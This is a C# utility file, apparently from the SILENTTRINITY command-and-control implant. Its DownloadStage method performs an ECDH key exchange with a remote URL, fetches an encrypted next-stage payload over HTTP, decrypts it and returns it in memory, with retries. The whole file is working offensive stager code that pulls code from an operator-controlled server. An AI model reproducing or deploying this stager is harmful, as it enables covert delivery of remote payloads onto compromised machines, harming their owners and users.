using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Math;
using SILENTTRINITY.Utilities.Crypto;

namespace SILENTTRINITY.Utilities
{
    public static class Internals
    {
        public static string GetDLLName(string name)
        {
            string dllName = name + ".dll";

            if (name.IndexOf(',') > 0)
            {
                dllName = name.Substring(0, name.IndexOf(',')) + ".dll";
            }

            return dllName;
        }

        public static byte[] GetResourceInZip(ZipStorer zip, string resourceName)
        {
            foreach (var entry in zip.ReadCentralDir())
            {
                if (entry.FilenameInZip == resourceName)
                {
                    var resdata = new byte[entry.FileSize];
                    zip.ExtractFile(entry, out resdata);
                    return resdata;
                }
            }
            return default;
        }

        public static MemoryStream DownloadStage(Uri URL, int sleep = 10, int retries = 5)
        {
            return Retry.Do(() =>
            {
                var crypto = GetECDeffieHellmanCrypto(URL);
                var key = crypto.GenerateAESKey();
                var stage = crypto.Decrypt(key, Http.Get(URL));
                return new MemoryStream(stage);
            }, TimeSpan.FromSeconds(sleep), retries);
        }

        static ECDeffieHellman GetECDeffieHellmanCrypto(Uri uri)
        {
            var crypto = new ECDeffieHellman();
            var publicKey = crypto.PublicKey;

            // Really ugly, I know, but we're trying to reduce extra dependencies...
            string json = string.Format("{{'x': \"{0}\",'y': \"{1}\"}}",
                    publicKey.Q.Normalize().AffineXCoord,
                    publicKey.Q.Normalize().AffineYCoord
                );

            string response = Encoding.UTF8.GetString(Http.Post(uri,
                                 Encoding.UTF8.GetBytes(json))).Replace("\"", "'");

            // Really ugly, I know, but we're trying to reduce extra dependencies...
            MatchCollection mcx = new Regex(@"': (.+?) ").Matches(response);
            string mcy = response.Substring(response.LastIndexOf(": ",
                            StringComparison.Ordinal) + 1).Replace("}", "").Trim();

            crypto.GenerateServerPublicKey(new KeyCoords
            {
                X = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", "")),
                Y = new BigInteger(mcy)
            });

            return crypto;
        }
    }
}
